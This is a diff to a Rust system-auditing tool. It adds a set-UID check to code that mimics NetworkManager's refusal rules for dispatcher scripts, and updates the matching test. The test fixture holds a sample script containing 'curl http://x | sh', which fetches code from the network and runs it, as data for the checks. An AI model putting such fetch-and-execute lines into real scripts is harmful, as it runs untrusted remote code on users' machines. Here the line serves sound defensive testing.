@@ -1019,10 +1019,11 @@ fn nm_name_refused(name: &[u8]) -> Option<&'static str> {
     backup.then_some("a hidden, backup or package-manager copy")
 }
 
-/// NetworkManager refuses to run a dispatcher script it does not trust. These
-/// are its own checks, from nm-dispatcher's check_permissions: a script that
-/// fails one is present and inert, and reporting it as enabled would be a lie
-/// in the operator's favour.
+/// NetworkManager refuses to run a dispatcher script it does not trust: not a
+/// regular file, not owned by root, writable by group or other, or set-UID
+/// (the messages nm-dispatcher gives for each). The caller adds that it must
+/// be executable by its owner. A script that fails one is present and inert,
+/// and reporting it as enabled would be a lie in the operator's favour.
 fn nm_refusal(cx: &Ctx, rel: &Path) -> Vec<&'static str> {
     let mut why = Vec::new();
     match cx.root.stat_follow(rel) {
@@ -1035,6 +1036,9 @@ fn nm_refusal(cx: &Ctx, rel: &Path) -> Vec<&'static str> {
             }
             if m.mode & 0o022 != 0 {
                 why.push("writable by group or other");
+            }
+            if m.mode & 0o4000 != 0 {
+                why.push("set-UID");
             }
         }
         Err(_) => why.push("does not resolve to a file"),
@@ -1790,6 +1794,7 @@ exec /usr/sbin/sshd\n";
         let base = "etc/NetworkManager/dispatcher.d";
         put(&dir, &format!("{base}/01-ifupdown"), b"#!/bin/sh\n", 0o755);
         put(&dir, &format!("{base}/99-loose"), b"#!/bin/sh\ncurl http://x | sh\n", 0o777);
+        put(&dir, &format!("{base}/05-suid"), b"#!/bin/sh\n", 0o4755);
         put(&dir, &format!("{base}/pre-up.d/10-early"), b"#!/bin/sh\n", 0o755);
         put(&dir, &format!("{base}/no-wait.d/20-async"), b"#!/bin/sh\n", 0o644);
 
@@ -1814,12 +1819,13 @@ exec /usr/sbin/sshd\n";
             "0755 is not a permission NetworkManager objects to"
         );
 
+        assert!(one(&s, Kind::NetworkDispatcher, "05-suid").raw["skipped_by_networkmanager"].contains("set-UID"));
         assert_eq!(one(&s, Kind::NetworkDispatcher, "10-early").raw["hook_phase"], "pre-up");
         let async_hook = one(&s, Kind::NetworkDispatcher, "20-async");
         assert_eq!(async_hook.raw["hook_phase"], "no-wait");
         assert_eq!(async_hook.enabled, Enablement::Disabled, "not executable");
 
-        assert_eq!(of_kind(&s, Kind::NetworkDispatcher).len(), 4, "subdirectories are not scripts");
+        assert_eq!(of_kind(&s, Kind::NetworkDispatcher).len(), 5, "subdirectories are not scripts");
         fs::remove_dir_all(&dir).unwrap();
     }
 
